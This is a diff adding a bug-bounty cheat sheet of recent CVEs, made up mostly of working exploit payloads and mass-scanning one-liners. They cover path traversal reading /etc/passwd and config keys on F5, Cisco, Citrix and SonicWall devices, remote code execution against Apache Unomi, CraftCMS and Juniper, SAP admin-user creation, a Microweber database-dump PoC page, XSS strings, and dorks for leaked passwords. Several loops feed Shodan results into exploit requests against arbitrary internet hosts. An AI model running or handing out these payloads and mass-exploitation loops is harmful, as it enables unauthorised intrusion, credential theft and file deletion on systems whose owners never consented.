@@ -1,0 +1,411 @@
+CVE's for Bug Bounties & Penetration Testing:
+=============================================
+Twitter:- https://twitter.com/CVEnew?s=20
+
+https://nvd.nist.gov/vuln/search  --> 5902 --> CVE 2020 5902 (BigIP)
+https://cve.mitre.org/cve/search_cve_list.html  --> 2020-5902
+https://cvedetails.com/google-search-results.php?q=5902  --> 5902
+
+https://bugcrowd.com/vulnerability-rating-taxonomy
+Common Vulnerability Scoring System Version 3.1 Calculator
+https://fast.org/cvss/3.1/specification-document
+
+https://shodan.io/data -> 10,000 results cost 1 Credit.
+https://shodan.io/report -> Report Generate Free
+https://images.shodan.io -> Image Gallery
+
+Shodan Exploit: https://exploits.shodan.io/welcome  --> apache
+https://exploit-db.com/exploits/
+
+Censys Subdomain Enumeration: https://censys.io
+https://censys.io/certificates?q=hacktify.in
+
+Censys Automation:
+------------------
+export CENSYS_API_SECRET="CENSYS_API_SECRET_KEY"
+export CENSYS_API_ID="CENSYS_API_SECRET_ID"
+https://github.com/gelim/censys
+
+SSL Certs:
+----------
+python3 censys_io.py --limit 20 uber
+Filter based on HTML:
+---------------------
+python3 censys_io.py --html-title "Hacked by" --limit 20 --html
+
+Google Dorks:
+-------------
+site:
+inurl:
+intext:
+filetype:
+intitle:
+https://exploit-db.com/google-hacking-database?category=8
+allintext:password filetype:log after:2018
+filetype:env "DB_PASSWORD" after:2018
+filetype:xls inurl:"emails.xls"
+inurl:top.htm inurl:currenttime
+
+Build Unique Dorks Like: intitle:"index of" "apache.log"
+Email Subject: intitle:"index of" "apache.log"
+Email to: dorks@offsec.com
+Body:
+----
+My name is "YOUR_NAME" and I would like to report a new Google Dork.
+Description: intitle:"index of" "apache.log"
+This google dork gives us the apache server logs and others sensetive information.
+Proof of Concept:
+{{Attach Screenshots}}
+
+https://crt.sh/?q=paypal.com  or use script from github...
+
+dump and die....
+
+CVE 2020-13405: Microweber Database Disclosure (Unauthenticated) - Base Score: 7.5 HIGH:
+----------------------------------------------------------------------------------------
+Request to: /controller.php  ---> USERS DATABASE
+Goolge Dorks: @Copyright 2020 Microweber CMS Ltd.
+https://rhinosecuritylabs.com/research/microweber-database-disclosure/
+
+Exploit POC:
+------------
+<html>
+<head>
+<meta name="referrer" content="origin">
+<script>
+function updateForm()
+{
+var modulesUrl = document.getElementById("module_url").value;
+if(modulesUrl != "")
+{
+document.getElementById("exploit_form").action = modulesUrl;
+return true;
+}
+else
+{
+alert("Please enter a URL into the MicroWeber Module Endpoint URL field.")
+return false;
+}
+}
+</script>
+</head>
+<h1 style="color:red;">CVE-2020-13405 PoC</h1>
+<h3 style="color:red;"></h3>
+<br>
+<label for="fname">MicroWeber Module Endpoint URL</label>
+<input type="test" id="module_url" name="module_url" placeholder="http://localhost/module">
+<form action="/placeholder" method="post" id="exploit_form" name="exploit_form">
+<input type="submit" value="Attemp Exploit" onclick="return updateForm()">
+<input type="hidden" id="module" name="module" value="users/controller">
+</form>
+</html>
+
+$ nano cve2020-13405.html
+$ python -m SimpleHTTPServer 8081
+$ ifconfig  --> local ip
+Open browser: http://local-ip:8081/cve2020-13405.html
+Endpoint URL:  http://<target-ip>/module
+Find Target: Censys=> MicroWeber (IPv4 Hosts)
+
+Request Like:
+-------------
+POST /module HTTP/1.1
+Host: IP
+...................
+...................
+module=users%2Fcontroller
+BooM ---> Database Dump(Admin Creds)...
+
+
+CVE 2020-14179: JIRA DATA DISCLOSURE: Base Score: 5.3 MEDIUM:
+-------------------------------------------------------------
+Request to /secure/QueryComponent!Defalut.jspa    --> Custom field names, Custom SLA names
+https:/jira.atlassian.com/browser/JIRASERVER-71536
+
+Automation Script:
+------------------
+cat ibm.txt | while read host do;do curl -s -k --insecure --path-as-is "$host/secure/QueryComponent!Defalut.jspa" | grep -qsi 'searchers' && \print "host \033[0;31mVulnerable\n" || print "$host \033[0;32mNot Vulnerable\n";done
+
+CVE 2020-14181: JIRA USER DISCLOSURE: Base Score: 5.3 MEDIUM:
+-------------------------------------------------------------
+Request to /secure/ViewUserHover.jspa  ---> INFORMATION DISCLOSURE
+
+Automation Script:
+------------------
+cat ibm.txt | while read host do;do curl -s -k --insecure --path-as-is "$host/secure/ViewUserHover.jspa" | grep -qsi 'User does not exist' && \print "host \033[0;31mVulnerable\n" || print "$host \033[0;32mNot Vulnerable\n";done
+
+CVE 2020-8512: IceWrap WebMail <=11.4.4.1: RXSS
+---------------------------------------------
+Dork: inurl:/webmail/ intext:Powered by IcwWrap Server site:*.dk
+https://localhost/webmail/?color="><svg/onload=alert(1)>
+
+CVE 2020-5902 for Fun & Profit:
+-------------------------------
+F5 Big IP - RCE
+
+Exploit PoC:
+============
+https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?filename=/etc/passwd
+https://{host}/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
+https://{host}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=jaffa
+https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
+https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?filename=/config/bigip.conf
+
+Nmap Exploit:
+-------------
+wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
+$ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
+
+Curl Exploit:
+=============
+curl -sk 'https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?filename=/etc/passwd'
+curl -sk 'https://{IP}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?filename=/etc/passwd'
+
+
+Nuclei Template:  projectdiscovery-nucelitemplate--> CVE-2020-5902.yaml
+----------------
+nuceli -t ~/tool/nuclei/nuclei-templates/cves/CVE-2020-5902.yaml -l targets.txt
+
+
+Not So Blurred Payload:
+-----------------------
+curl -v -k 'https://[F5Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
+ReadFile: curl -v -k 'https://[F5Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
+
+Testing:  http://threatintel.xyz/F5checker.php
+
+Automation Mass Hunting:
+=======================
+Shodan for Target:
+------------------
+shodan search http.favicon.hash:-335242539 "3993" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \print "host \033[0;31mVulnerable\n" || print "$host \033[0;32mNot Vulnerable\n";done
+
+CISCO File Read Hunting:
+------------------------
+CVE-2020-3452
+Shodan: +CSCOE+
+Shodan: Cisco ASA
+curl -s '$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'
+
+Automate:
+---------
+shodan search Cisco ASA --fields ip_str,port --separator " " | awk '{print $1}' | while read host do;do curl -s -k "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../' ; done
+https://chaos.projectdiscovery.io --> download subdomains and mass scan... save as json/txt
+cat targets.json | awk '{print $1}' | while read host do;do curl -s -k "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../' ; done
+nmap -iL target.json --script test_cisco_asa.nse -sV -Pn -vv
+
+CISCO File Delete Hunting:
+--------------------------
+Curl Request: curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://target/+CSCOE+/session_password.html
+File to Delete: https://target.com/+CSCOU+/csco_logo.gif
+
+
+CVE 2020-24223: MaraCMS XSS - Base Score: 6.1 MEDIUM:
+-----------------------------------------------------
+Powered by Mara cms
+Req to /contact.php?theme=tes%22%3E%3Cscript%3Ealert(%27awesomexss%27)%3C/script%3E%27
+
+Automation Script:
+------------------
+cat targets.txt | while read host do;do curl -s -k --insecure "$host/contact.php?theme=tes%22%3E%3Cscript%3Ealert('awesomexss')%3C/script%3E%27'" | grep -qsi "User does not exist" && \print "host \033[0;31mVulnerable\n" || print "$host \033[0;32mNot Vulnerable\n";done
+
+Google Collab Free VPS Bug Bounty Liifetime:
+============================================
+https://colab.research.google.com/github/hackingguy/Bug-Hunting-Colab/blob/master/Bug_Hunting_Colab.ipnyb
+
+Automation of Workflow & Alerts:
+--------------------------------
+https://api.slack.com/apps?new_app=1 -> Create New App > Incoming Webhooks > Webhook URL > Copy
+export SLACK_WEBHOOK_URL="https://hooks.slack.com/services/RANDOMSLACKTOKEN"
+Or save into .bash_profile
+Test: echo "BugBountyVPS" | slackcat
+
+Visual Recon with Fast Screenshoot:
+-----------------------------------
+cat urls.txt | go-stare -o ./out -q 90
+
+CVE-2020-6286:CVSS 5.3 MEDIUM:
+------------------------------
+Leading to Path Traversal....
+Shodan/Censys:  SAP NetWeaver Application Server
+https://github.com/chipik/SAP_RECON
+CVE-2020-6286
+
+Automate:
+---------
+cat ~/wordlist/Seclists/Fuzzing/LFI/dicc.txt | while read file do;do python3 RECON.py -H 14.98.236.4 -f $file.zip;done
+
+CVE-2020-6287:CVSS 10 CRITICAL:
+------------------------------
+Run code and execute commands...
+All are same as 2020-6286...
+$ python RECON.py -H <TARGET-HOST> -u  ---> New User Willbe Created!
+$ python RECON.py -H <TARGET-HOST> -a  ---> Admin User Willbe Created!
+
+Automation:
+-----------
+shodan search SAP NewWeaver AS Java --fields ip_str,port --separator " " | awk '{print $1}' | while read host do;do python RECON.py -H $host -c --timeout 10 -s;done
+
+
+CVE 2019-11248: Kubelet Kubernetes Software: Base Score: 8.2 HIGH:
+------------------------------------------------------------------
+Request to: /debug/pprof  --> Information Disclosure
+Rohit Bug URL Looks: http://panel-ssl.shazam.com/debug/pprof
+
+Citrix Path Traversal Live Hunting:
+-----------------------------------
+Shodan: /zdm/login_xdm_uc.jsp
+
+CVE-2020-8209: Path Traversal - Base Score:7.5 HIGH:
+----------------------------------------------------
+Citrix XenMobile Server - ArbitaryFileRead --> /etc/passwd
+GET /jsp/help-sb-download.jsp?sbFileName=../../../opt/sas/sw/config/sftu.properties HTTP/1.1
+Path traversal to: /opt/sas/rt/keys/security.properties
+
+Passwd File  : /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd
+Configuration: /opt/sas/sw/config/sftu.properties
+Keys         : /opt/sas/rt/keys/security.properties
+
+
+Apache RCE: CVE 2020-13942: CVSS Score: 10 CRITICAL:
+----------------------------------------------------
+Censys: Apache Unomi
+
+https://github.com/eugenebmx/CVE-2020-13942
+https://github.com/lp008/CVE-2020-13942
+
+Automation Script:
+------------------
+cat targets.txt | while read host do;do curl --insecure --silent -X POST http://$host/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}' | grep -qs "boom" && \print "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
+
+------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------
+
+1.CVE-2023-22515 One Liner : Confluence Data Center & Server: Privilege Escalation
+POC: cat file.txt| while read host do;do curl -skL "http://$host/setup/setupadministrator.action" | grep -i "<title>Setup System Administrator" && echo $host "is VULN";done
+
+Description:
+This one-liner reads URLs from "file.txt," sends HTTP requests to URLs, and checks if the response title includes "Setup System Administrator," indicating a vulnerability. If found, it prints the host as vulnerable.
+
+Reference:-
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22515
+https://twitter.com/HackerGautam/status/1710036949715788219
+
+------------------------------------------------------------------------------------------------------
+2. CVE-2023-41892 One Liner : CraftCMS - RCE
+POC: cat file.txt| while read h do;do curl -sk "https://$h/index.php" -X POST -d 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCo
+ndition&config={"name":"test[userCondition]","asxyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":[{"close":null}],"_fn_close":"phpinfo"}}'| grep 'PHP Credits' && echo $h;done
+
+Description:
+This one-liner reads urls from "file.txt," sends POST requests to URLs with specific parameters, and checks if the response contains 'PHP Credits.' If found, it prints the host.
+
+Reference:-
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41892
+https://twitter.com/HackerGautam/status/1709297240714735709
+
+------------------------------------------------------------------------------------------------------
+3. CVE-2023-0126 One Liner : SonicWall SMA1000 - File Read Bug
+POC: cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
+
+Description:
+This one-liner reads hosts from "file.txt," attempts to access the "/etc/passwd" file on
+port 8443 with possible path traversal, and checks if it contains 'root:'. If found, it
+identifies the host as vulnerable to potential path traversal attacks
+
+Reference:-
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0126
+https://twitter.com/HackerGautam/status/1707113207939334186
+
+------------------------------------------------------------------------------------------------------
+4. CVE-2023-36845 One Liner : Juniper Web Device Manager - RCE 
+POC: cat file.txt| while read host do;do curl -sk "http://$host/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'| grep -i 'root:' && echo $host "is VULN";done
+
+Description:
+This one-liner reads hosts from "file.txt," sends POST requests with a specific payload to each host, attempting to include the "/etc/passwd" file, and if it finds 'root:' in the response, it marks the host as vulnerable to a potential remote file inclusion (RFI) attack.
+
+Reference:-
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36845
+https://twitter.com/HackerGautam/status/170658951674249248
+
+------------------------------------------------------------------------------------------------------
+CVE-2023-41507
+Super Store Finder v3.6 was discovered to contain multiple SQL injection 
+vulnerabilities in the store locator component via the products, distance, lat, and lng 
+parameters.
+https://github.com/redblueteam/CVE-2023-41507
+
+------------------------------------------------------------------------------------------------------
+CVE-2023-40924
+Contec SolarView Compact <6.00 
+Vendor: https://www.contecinc.com/
+GitHub Link:- https://github.com/Yobing1/CVE-2023-40924/blob/main/README.md
+
+------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
